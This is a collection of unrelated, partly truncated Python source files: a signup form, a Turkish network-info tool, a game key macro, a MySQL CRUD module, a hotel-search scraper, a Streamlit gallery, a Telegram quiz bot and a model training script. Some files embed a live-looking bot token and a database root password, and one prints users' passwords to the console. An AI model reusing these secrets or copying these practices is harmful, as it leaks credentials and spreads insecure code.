    "import flet as ft\r\nfrom flet import Checkbox, Column, ElevatedButton, Row, Text, TextField\r\nfrom flet_core.control_event import ControlEvent\r\n\r\n\r\ndef main(page: ft.Page) -> None:\r\n    # Configura\u00e7\u00f5es da p\u00e1gina\r\n    page.title = 'Cadastro'\r\n    page.vertical_alignment = ft.MainAxisAlignment.CENTER\r\n    page.theme_mode = ft.ThemeMode.DARK\r\n    page.window_width = 400\r\n    page.window_height = 400\r\n    page.window_resizable = False\r\n\r\n    # Campos de Cadastro\r\n    text_username: TextField = TextField(label='Nome de Usu\u00e1rio', text_align=ft.TextAlign.LEFT, width=200)\r\n    text_password: TextField = TextField(label='Senha', text_align=ft.TextAlign.LEFT, width=200, password=True)\r\n    Checkbox_signup: Checkbox = Checkbox(label='Aceitar Termos', value= False)\r\n    button_submit: ElevatedButton = ElevatedButton(text='Cadastrar', width=200, disabled=True)\r\n\r\n    # Fun\u00e7\u00e3o para validar preenchimento dos campos\r\n    def validate(e: ControlEvent) -> None: \r\n        \"\"\"Valida se todos os campos foram preenchidos corretamente.\"\"\"\r\n        if all([text_username.value, text_password.value, Checkbox_signup.value]):\r\n            button_submit.disabled = False\r\n        else: \r\n            button_submit.disabled = True \r\n        page.update()\r\n\r\n    # Fun\u00e7\u00e3o para submeter cadastro\r\n    def submit(e: ControlEvent) -> None:\r\n        \"\"\"Submete o cadastro e exibe mensagem de boas-vindas.\"\"\"\r\n        print('Nome de Usu\u00e1rio:', text_username.value)\r\n        print('Senha:', text_password.value)\r\n\r\n        page.clean()\r\n        page.add(\r\n            Row(\r\n                controls=[Text(value=f'Bem-vindo: {text_username.value}', size=20)],\r\n                alignment=ft.MainAxisAlignment.CENTER\r\n            )\r\n        )\r\n\r\n    # Atribui\u00e7\u00e3o de eventos \u00e0s fun\u00e7\u00f5es de valida\u00e7\u00e3o\r\n    Checkbox_signup.on_change = validate\r\n    text_username.on_change = validate\r\n    text_password.on_change = validate\r\n    button_submit.on_click = submit \r\n\r\n    # Adiciona os controles \u00e0 p\u00e1gina\r\n    page.add(\r\n        Row(\r\n            controls=[\r\n                Column(\r\n                    [text_username,\r\n                    text_password,\r\n                    Checkbox_signup,\r\n                    button_submit]\r\n                )\r\n            ],\r\n            alignment=ft.MainAxisAlignment.CENTER\r\n        )\r\n    )\r\n\r\nif __name__ == '__main__':\r\n    # Inicia a aplica\u00e7\u00e3o\r\n    ft.app(target=main)\r\n",
    "#!/usr/bin/env python3\n\n# *********************************************** #\n\n# *** TARIK VARDAR taraf\u0131ndan haz\u0131rlanm\u0131\u015ft\u0131r. *** #\n\n# tarikvardar@gmail.com\n# github.com/tvardar\n\n\n\n#    GPL V.3 L\u0130SANSINA G\u00d6RE KULLANILAB\u0130L\u0130R\n#    M\u00fcmk\u00fcn olu\u011funca \u00e7ok a\u00e7\u0131klama eklenmi\u015ftir.\n#    Pardus Linux i\u00e7in haz\u0131rlanm\u0131\u015ft\u0131r. Gnome - Xfce - Kde desteklemektedir.\n#    Program her hangi bir sorumluluk kabul etmemektedir.\n\n# *********************************************** #\n\n\n\n\n\n\n# GEREKLI KUTUPHANELERI ICE AKTARIYORUZ #\n# ------------------------------------- #\n\nimport sys\nimport os\nfrom PyQt5.QtWidgets import *\nfrom AnaSayfaUI import *\nimport subprocess\nimport socket\nimport requests\nimport psutil\n\n\n#----------------------UYGULAMA OLU\u015eTUR-------------------#\n#---------------------------------------------------------#\nUygulama=QApplication(sys.argv)\npenAna=QMainWindow()\nui=Ui_MainWindow()\nui.setupUi(penAna)\npenAna.show()\n\n\n\n\n# ************************************************************************* #\n# *** **** *** **** S\u0130STEM VE A\u011e B\u0130LG\u0130LER\u0130 SEKMES\u0130 B\u00d6L\u00dcM\u00dc **** *** **** *** #\n# ************************************************************************* #\n\n\n\n\n# ---- S\u0130STEM B\u0130LG\u0130LER\u0130 B\u00d6L\u00dcM\u00dc ---- #\n# --------------------------------- #\ndef sistem ():\n    sistem = os.name\n    sistem_tur = [sistem]\n    if sistem_tur [0]== (\"posix\"):\n\n        # uname -a \u00e7\u0131kt\u0131s\u0131n\u0131 al\u0131yoruz\n        uname_info = os.uname()\n\n        # Ayr\u0131 ayr\u0131 bilgilere eri\u015fim\n        system = uname_info.sysname\n        node = uname_info.nodename\n        release = uname_info.release\n        #version = uname_info.version\n        #machine = uname_info.machine\n        ui.lblSistem.setText(system)\n        ui.lblPcadi.setText(node)\n        ui.lblKernel.setText(release)\n\n    else:\n        ui.lblSistem.setText(\"Program Linux Debian S\u00fcr\u00fcmleri i\u00e7in haz\u0131rlanm\u0131\u015ft\u0131r\")\n\n\n# ---- INTERNET BAGLANTISI B\u00d6L\u00dcM\u00dc ---- #\n# ------------------------------------ #\n\n# a) Bir def (fonksiyon) icerisinde internet baglantimiz kontrol edecegiz.\n# b) Baglanti var ise Yerel IP, Harici IP, Konum ve Wifi Sifre bilgilerini alacagiz\n# c) Baglanti yoksa ilgili bolumlerde \"Internet Baglantiniz Yok !!\" uyar\u0131s\u0131 verecegiz.\n\ndef internet_baglanti():\n    try:\n        # Bir web sitesine GET iste\u011fi g\u00f6ndererek internet ba\u011flant\u0131s\u0131n\u0131 kontrol ediyoruz\n        response = requests.get(\"http://www.google.com\", timeout=5)\n        return True # HTTP ba\u015far\u0131l\u0131 bir \u015fekilde d\u00f6nerse, internet ba\u011flant\u0131s\u0131 oldu\u011funu anl\u0131yoruz.\n    except requests.ConnectionError:\n        return False # Baglanti hatasi var ise Internet baglantisinin olmadigini anliyoruz.\n\n\n# Baglanti var ise, OpenDns 'ten ald\u0131gimiz Harici Ip bilgimizi degiskene atiyoruz\nif internet_baglanti():\n    Harici_Ip = \"dig +short myip.opendns.com @resolver1.opendns.com\"\n    ip= subprocess.getoutput(Harici_Ip)\n\n    # OpenDns iceriginden ulke, sehir ve servis saglayici bilgilerimizi ayiriyoruz.\n    # Gelen verilerden bolge, zaman dilimi, posta kodu ve koordinat verilerini almadim.\n    # Bilgi icin satir icinde durmakta, kullanmak isteyenler yorum isareti olan # kaldirip kullanabilir.\n\n    country = requests.get(\"https://ipinfo.io/{}/country/\".format(\n        ip)).text  # ! {} kullanarak ip adresini yazd\u0131r\u0131p hedeften .text fonksiyonu ile yaz\u0131y\u0131 \u00e7ekiyoruz.\n    city = requests.get(\"https://ipinfo.io/{}/city/\".format(ip)).text  # ! Ayn\u0131 i\u015flemleri uyguluyoruz.\n    #region = requests.get(\"https://ipinfo.io/{}/region/\".format(ip)).text\n    #postal = requests.get(\"https://ipinfo.io/{}/postal/\".format(ip)).text\n    #timezone = requests.get(\"https://ipinfo.io/{}/timezone/\".format(ip)).text\n    orgination = requests.get(\"https://ipinfo.io/{}/org/\".format(ip)).text\n    #location = requests.get(\"https://ipinfo.io/{}/loc/\".format(ip)).text\n\n    # Baglanti varsa, line ve label alanlarina ip, ulke, sehir ve servis saglayiciyi yazdiriyoruz\n    ui.lineip.setText(ip)\n    ui.lblUlke.setText(country)\n    ui.lblSehir.setText(city)\n    ui.lblServissagla.setText(orgination)\n\n\n    # G\u00f6ster t\u0131klan\u0131nca Harici ip'yi g\u00f6stersin. T\u0131klanmazsa Y\u0131ld\u0131zl\u0131 kals\u0131n\n    def goster():\n        if ui.lineip.echoMode() == QLineEdit.Password:\n            ui.lineip.setEchoMode(QLineEdit.Normal)\n            ui.lineip.setText(ip)\n        else:\n            ui.lineip.setEchoMode(QLineEdit.Password)\n\n    # Butona tiklandiginda calismasi icin, goster fonksiyonu baglantisini yaptik.\n    ui.btngoster.clicked.connect(goster)\n\n    # Bu kisimda baglanti yoksa, line ve label iclerine k\u0131rm\u0131z\u0131 olarak baglanti yok yazacak.\nelse:\n    ui.lblUlke.setText('<font color=\"red\">\u0130nternete Ba\u011fl\u0131 De\u011filsiniz !!</font>')\n    ui.lblSehir.setText('<font color=\"red\">\u0130nternete Ba\u011fl\u0131 De\u011filsiniz !!</font>')\n    ui.lblServissagla.setText('<font color=\"red\">\u0130nternete Ba\u011fl\u0131 De\u011filsiniz !!</font>')\n\n\n\n# ---- WI-FI SIFRESI BOLUMU ---- #\n# ------------------------------ #\n\n# Sifre adinda bir fonksiyon tan\u0131mlay\u0131p, Subprocess modulu ile nmcli \u00fczerindeki verileri aliyoruz.\ndef wifisifre ():\n    if internet_baglanti():\n        wsifre = subprocess.check_output(['nmcli', '",
    "from .addition_operation import AdditionOperation\nfrom .and_operation import AndOperation\nfrom .divide_operation import DivideOperation\nfrom .equality_operation import EqualityOperation\nfrom .greater_equal_operation import GreaterEqualOperation\nfrom .greater_operation import GreaterOperation\nfrom .modulo_operation import ModuloOperation\nfrom .multiplying_operation import MultiplyingOperation\nfrom .not_equal_operation import NotEqualOperation\nfrom .or_operation import OrOperation\nfrom .power_operation import PowerOperation\nfrom .smaller_equal_operation import SmallerEqualOperation\nfrom .smaller_operation import SmallerOperation\nfrom .subtraction_operation import SubtractionOperation\nfrom .xor_operation import XorOperation\n\nORDERED_PAIR_VALUES_OPERATIONS = [\n    PowerOperation(),\n    MultiplyingOperation(),\n    DivideOperation(),\n    ModuloOperation(),\n    AdditionOperation(),\n    SubtractionOperation(),\n    EqualityOperation(),\n    GreaterEqualOperation(),\n    GreaterOperation(),\n    SmallerEqualOperation(),\n    SmallerOperation(),\n    NotEqualOperation(),\n    AndOperation(),\n    OrOperation(),\n    XorOperation()\n]\n",
    "import keyboard\nimport psutil\nimport time\nimport random\n\ndef circle_strafe():\n    try:\n        keys = ['a', 'd']\n        for _ in range(55):\n            try:\n                random_key = random.choice(keys)\n                duration = random.uniform(0.05, 0.3)\n                keyboard.press(random_key)\n                time.sleep(duration)\n                keyboard.release(random_key)\n            except Exception as e:\n                print(e)\n    except Exception as e:\n        print(e)\n\ndef escape_danger():\n    try:    \n        stem = \"q\"\n        forward = \"w\"\n        jump_pad = \"z\"\n        ctrl = \"ctrl\"\n        space = \"space\"\n        run_duration = 0.3 \n        jump_delay = 1\n        stem_delay = 0.4\n        keyboard.press(forward)\n        time.sleep(run_duration)\n        keyboard.press(stem)\n        time.sleep(stem_delay)\n        keyboard.release(stem)\n        keyboard.press(forward)\n        keyboard.press(jump_pad)\n        time.sleep(jump_delay)\n        keyboard.release(jump_pad)\n        keyboard.press(ctrl)\n        time.sleep(0.1)\n        keyboard.release(ctrl)\n        keyboard.press(forward)\n        keyboard.press(space)\n        keyboard.press(forward)\n        time.sleep(3)\n        keyboard.release(space)\n        keyboard.release(forward)\n    except:\n        return    \n\ndef auto_run():\n    stem = \"q\"\n    forward = \"w\"\n    ctrl = \"ctrl\"\n    space = \"space\"\n    slide_reset = 0.1\n    stem_delay = 0.4\n    loop_reset = 0.30\n    jump_delay = 0.01\n    keyboard.press(forward)\n    keyboard.press(stem)\n    time.sleep(stem_delay)\n    keyboard.release(stem)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n    keyboard.release(forward)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n    keyboard.release(forward)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.press(forward)\n    keyboard.press(ctrl)\n    time.sleep(jump_delay)\n    keyboard.press(space)\n    time.sleep(slide_reset)\n    keyboard.release(ctrl)\n\n    time.sleep(loop_reset)\n    keyboard.pr",
    "import mysql.connector\r\n\r\n# Establish connection to MySQL database\r\nmydb = mysql.connector.connect(\r\n    host=\"localhost\",\r\n    user=\"root\",\r\n    password=\"SALAH.BERRET.0\",\r\n    database=\"company_management\"\r\n)\r\n\r\n# Function to fetch all employee records from the database\r\ndef fetch_employee():\r\n    cur = mydb.cursor()\r\n    cur.execute(\"SELECT * FROM employee\")\r\n    rows = cur.fetchall()\r\n    cur.close()\r\n    return rows\r\n\r\n# Function to insert a new employee record into the database\r\ndef insert_employee(emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL INSERT statement\r\n    cur.execute(\"INSERT INTO employee VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\", (emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to delete an employee record from the database\r\ndef delete_employee(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL DELETE statement\r\n    cur.execute(\"DELETE FROM employee WHERE emp_id=%s\", (emp_id,))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to update an employee record in the database\r\ndef update_employee(new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL UPDATE statement\r\n    cur.execute(\"UPDATE employee SET first_name = %s, last_name = %s, birth_day = %s, sex = %s, salary = %s, super_id = %s, branch_id = %s WHERE emp_id = %s\", (new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to check if an employee with the given ID exists in the database\r\ndef id_exists(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL SELECT statement to count the number of rows with the given ID\r\n    cur.execute(\"SELECT COUNT(*) FROM employee WHERE emp_id = %s\", (emp_id,))\r\n    count = cur.fetchone()[0]\r\n    cur.close()\r\n    # Return True if count is greater than 0, indicating the ID exists; otherwise, return False\r\n    return count > 0\r\n",
    "import time\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nimport booking.constants as const\nfrom booking.booking_filtration import BookingFiltration\nfrom prettytable import PrettyTable\n\n\nclass Booking(webdriver.Chrome):\n    def __init__(self, driver_path=r\"C:\\chromedriver.exe\", teardown=False):\n        self.driver_path = driver_path\n        self.teardown = teardown\n        options = webdriver.ChromeOptions()\n        options.add_experimental_option('excludeSwitches', ['enable-logging'])\n        super(Booking, self).__init__(options=options)\n        self.implicitly_wait(15)\n        self.maximize_window()\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        if self.teardown:\n            self.quit()\n\n    def land_first_page(self):\n        self.get(const.BASE_URL)\n\n    def change_currency(self, currency=None):\n        currency_element = self.find_element(by=By.XPATH,\n                                             value='//*[@id=\"b2searchresultsPage\"]/div[3]/div/div/header/nav[1]/div[2]/span[1]/button')\n        currency_element.click()\n        selected_currency_element = self.find_element(by=By.XPATH,\n                                                      value='//*[@id=\"b2indexPage\"]/div[19]/div/div/div/div/div[2]/div/div[3]/div/div/div/ul[1]/li[1]/button')\n        selected_currency_element.click()\n\n    def check_popup(self):\n        try:\n            # print('Entered popup function')\n            # popup = self.find_element(by=By.XPATH,\n            #                           value='//*[@id=\"b2indexPage\"]/div[21]/div/div/div/div[1]/div[1]/div/button')\n            popup = self.find_element(by=By.CSS_SELECTOR, value='button[aria-label=\"Dismiss sign-in info.\"]')\n            # print('Located element')\n\n            popup.click()\n            # print('Popup dismissed')\n            return True\n        except:\n            return False\n            pass\n\n    def select_place_to_go(self, place_to_go):\n        try:\n            # print('Entered select_place_to_go function')\n            search_field = self.find_element(by=By.XPATH, value='//*[@id=\":re:\"]')\n            # print('Located search field')\n            search_field.clear()\n            search_field.send_keys(place_to_go)\n            search_field.click()\n            # print('Clicked search field')\n            time.sleep(2)\n            first_result = self.find_element(by=By.XPATH, value='//*[@id=\"autocomplete-result-0\"]')\n            first_result.click()\n        except Exception as e:\n            print('Error in Select places: ', e)\n\n    def select_dates(self, check_in_date, check_out_date):\n        try:\n            check_in_element = self.find_element(by=By.CSS_SELECTOR, value=f'span[data-date=\"{check_in_date}\"]')\n            check_in_element.click()\n            check_out_element = self.find_element(by=By.CSS_SELECTOR, value=f'span[data-date=\"{check_out_date}\"]')\n            check_out_element.click()\n        except Exception as e:\n            print('Error in selecting dates: ', e)\n\n    def select_adults(self, count=1):\n        try:\n            selection_element = self.find_element(by=By.CSS_SELECTOR, value='button[data-testid=\"occupancy-config\"]')\n            selection_element.click()\n            while True:\n                decrease_adult_element = self.find_element(by=By.XPATH,\n                                                           value='//*[@id=\":rf:\"]/div/div[1]/div[2]/button[1]')\n                decrease_adult_element.click()\n                adults_value_element = self.find_element(by=By.ID, value='group_adults')\n                adults_value = adults_value_element.get_attribute('value')  # gets count for adults\n                if int(adults_value) == 1:\n                    break\n\n            increase_button_element = self.find_element(by=By.XPATH,\n                                                        value='//*[@id=\":rf:\"]/div/div[1]/div[2]/button[2]')\n            for _ in range(count - 1):\n                increase_button_element.click()\n        except Exception as e:\n            print('Error in selecting adults: ', e)\n\n    def click_search(self):\n        try:\n\n            search_button = self.find_element(by=By.CSS_SELECTOR, value='button[type=\"submit\"]')\n            search_button.click()\n        except Exception as e:\n            print('Error in clicking search: ', e)\n\n    def apply_filtration(self):\n        filtration = BookingFiltration(driver=self)\n        filtration.apply_star_rating(3, 4, 5)\n        filtration.sort_price_lowest_first()\n\n    def report_results(self):\n        hotels = self.find_element(by=By.CLASS_NAME, value='d4924c9e74').find_elements(by=By.CSS_SELECTOR,\n                                                                                       value='div[data-testid=\"property-card\"]')\n        # print(len(hotels))\n        hotel_data = []\n        for hotel in hotels:\n            name = hotel.find_element(by=By.CSS_SELECTOR, value='div[data-testid=\"title\"]').get_attribute(\n                'innerHTML').strip()\n",
    "\"\"\"\nThis file is a page of streamlit UI microservice and provides database preview.\n\"\"\"\nimport streamlit as st\nimport pandas as pd\n\nfrom util_funs import *\n\n\ndef app():\n    \"\"\"\n    Database preview page\n    \"\"\"\n    \n    st.title('Gallery')\n\n    data = get_data()\n    df = data['data']\n\n    if len(df) == 0:\n        st.write('Nothing here yet. Generate some captions and push them to the database so they will apear here!')\n\n    else:\n        df = pd.DataFrame(df, columns=data['colnames'])\n        \n        \n        st.button('Purge database', on_click = delete_all_rows)\n        st.markdown(\"\"\"\n                <style>\n                .caption-font {\n                    font-size:16px !important;\n                    font-style: italic;\n                }\n                </style>\n                \"\"\", unsafe_allow_html=True)\n        \n\n        c1, c2, c3 = st.columns([3, 1, 2], gap = 'medium')\n\n        c1.markdown('## Image')\n        c2.markdown('## Model used')\n        c3.markdown('## Caption')\n        \n        for ind, row in df.iterrows(): # draw images stored in database\n            image = decode_image(row['image_file']) \n            image.resize((128, 64))\n\n            caption = row['caption']\n            created_time = row['created_time']\n            model_used = row['model_used']\n\n\n            del_but, image_col, model_col, caption_col = st.columns([1, 3, 1, 2], gap = 'medium')\n            \n            image_col.image(image, caption = 'Created at: ' + str(created_time))\n            \n            model_col.markdown(f'*{model_used}*')\n\n            caption_col.markdown(f'<p class=\"caption-font\"> {caption} </p>', unsafe_allow_html=True)\n            \n            del_but.button('Delete', on_click = delete_row, key = str(ind), args = (str(created_time), caption))",
    "import os\nimport sqlite3\nimport logging\nimport random\nimport tracemalloc\nfrom telegram.ext import Application, MessageHandler, filters\nfrom telegram.ext import CommandHandler\nfrom telegram import ReplyKeyboardMarkup\nfrom telegram import ReplyKeyboardRemove\nfrom telegram.ext import ApplicationBuilder\n\ntracemalloc.start()\n\n# proxy_url = \"socks5://user:pass@host:port\"\n#\n# app = ApplicationBuilder().token(\"TOKEN\").proxy_url(proxy_url).build()\nBOT_TOKEN = '6533161431:AAH_iqGGFB5Ulk75XwXgdwa4zM16e5ccYJs'\n# \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u043b\u043e\u0433\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\nlogging.basicConfig(\n    filename=\"bot.log\", format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO\n)\nlogger = logging.getLogger(__name__)\n\n\nasync def start(update, context):\n    quiz = context.bot_data\n    quiz['game_mode'] = 0\n    quiz['points'] = 2\n    await update.message.reply_text(\n        \"\u041f\u0440\u0438\u0432\u0435\u0442! \u042d\u0442\u043e \u0431\u043e\u0442 \u043a\u0432\u0438\u0437\u043e\u0432. \u0427\u0442\u043e\u0431\u044b \u043d\u0430\u0447\u0430\u0442\u044c \u043d\u043e\u0432\u0443\u044e \u0438\u0433\u0440\u0443 \u0432\u0432\u0435\u0434\u0438 \u043d\u0438\u043a.\",\n        reply_markup=ReplyKeyboardRemove()\n    )\n\n\nasync def close_keyboard(update, context):\n    await update.message.reply_text(\n        \"Ok\",\n        reply_markup=ReplyKeyboardRemove()\n    )\n\n\ndef register(name=''):\n    connection = sqlite3.connect('tg_bot.sqlite')\n    cursor = connection.cursor()\n    result_id = cursor.execute(\"\"\"SELECT id FROM users ORDER BY id DESC limit 1\"\"\").fetchall()\n    id = result_id[0][0]\n    cursor.execute(\"\"\"INSERT INTO users VALUES (?,?,?)\"\"\", (id + 1, name, 0))\n    connection.commit()\n    connection.close()\n    # game_mode_update(1)\n\n\nasync def help(update, context):\n    await update.message.reply_text(\n        \"\u042f \u0431\u043e\u0442 \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a.\")\n\n\nasync def new_question(update):\n    connection = sqlite3.connect('tg_bot.sqlite')\n    cursor = connection.cursor()\n    id_id = random.randint(1, 15)\n    result = cursor.execute(\"\"\"SELECT ques, ans1, ans2, ans3, ans4, true_ans FROM questions WHERE id = ?\"\"\",\n                            (id_id,)).fetchall()\n    connection.commit()\n    connection.close()\n    await update.message.reply_text(f'{result[0][0]}')\n    reply_keyboard = [[f'{result[0][1]}'], [f'{result[0][2]}'],\n                      [f'{result[0][3]}'], [f'{result[0][4]}']]\n    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)\n    await update.message.reply_text(\n        result[0][0],\n        reply_markup=markup\n    )\n    # true_answer(result[0][5])\n\n\ndef check_points():\n    with open(\"points.txt\") as f:\n        return int(f.read())\n\n\nasync def points_change(delta=0):\n    points = check_points()\n    with open(\"points.txt\", \"w\") as f:\n        f.write(str(points + delta))\n\n\nasync def check_ans(update, answer='', ans1='', ans2='', ans3='', ans4='', true_answer=''):\n    print('\u041e\u0442\u0432\u0435\u0442 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u043b\u0438', answer, true_answer, ans1, ans2, ans3, ans4)\n    if answer == true_answer:\n        print('\u041e\u0442\u0432\u0435\u0442 \u0434\u0430\u043d \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439')\n        await update.message.reply_text(f'{update.message.text} - \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442! \u0412\u0430\u043c \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d 1 \u0431\u0430\u043b\u043b')\n        await points_change(1)\n    elif answer in [ans1, ans2, ans3, ans4]:\n        print('\u041e\u0442\u0432\u0435\u0442 \u0434\u0430\u043d \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439')\n        await update.message.reply_text('\u041a \u0441\u043e\u0436\u0430\u043b\u0435\u043d\u0438\u044e \u044d\u0442\u043e \u043d\u0435\u0432\u0435\u0440\u043d\u043e(...')\n        await points_change(-1)\n    else:\n        print('\u0441\u0442\u0440\u0430\u043d\u043d\u043e')\ndef game_mode():\n    with open(\"level.txt\") as my_file:\n        return int(my_file.read())\n\n\ndef game_mode_update(n):\n    with open(\"level.txt\", \"w\") as my_file:\n        my_file.write(str(n))\n\n\ndef true_answer(ans=''):\n    if ans:\n        with open('true_answer.txt', 'w') as f:\n            f.write(ans)\n    else:\n        with open('true_answer.txt') as f:\n            return f.read()\n\n\nasync def game(update, context):\n    quiz = context.bot_data\n\n    if quiz['game_mode'] == 0:\n        quiz['nick'] = update.message.text\n        print('\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0435\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f', quiz['nick'])\n        quiz['game_mode'] = 1\n        register(quiz['nick'])\n        # await update.message.reply_text(\n        #     f'\u041f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c {quiz[\"nick\"]} \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d! \u041d\u0430\u0436\u043c\u0438 \"/game\", \u0447\u0442\u043e\u0431\u044b \u043d\u0430\u0447\u0430\u0442\u044c \u0438\u0433\u0440\u0443'\n        # )\n        print(quiz)\n    if quiz['game_mode'] == 1:\n        print('\u041f\u043e\u0448\u043b\u0430 \u0438\u0433\u0440\u0430 \u0434\u043b\u044f ' + quiz['nick'])\n        quiz['game_mode'] = 2\n        # result = new_question()\n        connection = sqlite3.connect('tg_bot.sqlite')\n        cursor = connection.cursor()\n        id_id = random.randint(1, 15)\n        result = cursor.execute(\"\"\"SELECT ques, ans1, ans2, ans3, ans4, true_ans FROM questions WHERE id = ?\"\"\",\n                                (id_id,)).fetchall()\n        connection.commit()\n        connection.close()\n        true_answer(result[0][5])\n        quiz['ans1'] = result[0][1]\n        quiz['ans2'] = result[0][2]\n        quiz['ans3'] = result[0][3]\n        quiz['ans4'] = result[0][4]\n        reply_keyboard = [[f'{result[0][1]}'], [f'{result[0][2]}'],\n                          [f'{result[0][3]}'], [f'{result[0][4]}']]\n        markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)\n        await update.message.reply_text(\n            result[0][0],\n            reply_markup=markup\n        )\n    if quiz['game_mode'] == 2:\n        print('\u0420\u0435\u0436\u0438",
    "import torch\nfrom torch.utils.data import DataLoader\nfrom sklearn.metrics import accuracy_score, matthews_corrcoef\nfrom scipy.stats import entropy\nfrom tqdm import tqdm\nfrom data import MolecularGraphDataset\nfrom gin import ContraGIN\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\n\nhidden_dim = 30\nnum_layers = 6\nlearning_rate = 0.01\nnum_epochs = 10\nbatch_size = 32\n\ntrain_dataset = MolecularGraphDataset('./schneider50k_2014.tsv', split=\"train\")\nval_dataset = MolecularGraphDataset('./schneider50k_2014.tsv', split=\"test\")\n\n\ndef collate_fn(batch):\n    prec_data, prod_data, y_vals = zip(*batch)\n    y_vals = torch.stack([torch.argmax(y) for y in y_vals], dim=0)\n\n    prec_data = [data.to(device) if isinstance(\n        data, torch.Tensor) else data for data in prec_data]\n    prod_data = [data.to(device) if isinstance(\n        data, torch.Tensor) else data for data in prod_data]\n\n    return prec_data, prod_data, y_vals\n\n\ntrain_loader = DataLoader(\n    train_dataset, batch_size=batch_size, shuffle=True, collate_fn=collate_fn)\nval_loader = DataLoader(\n    val_dataset, batch_size=batch_size, collate_fn=collate_fn)\n\nmodel = ContraGIN(train_dataset,\n                  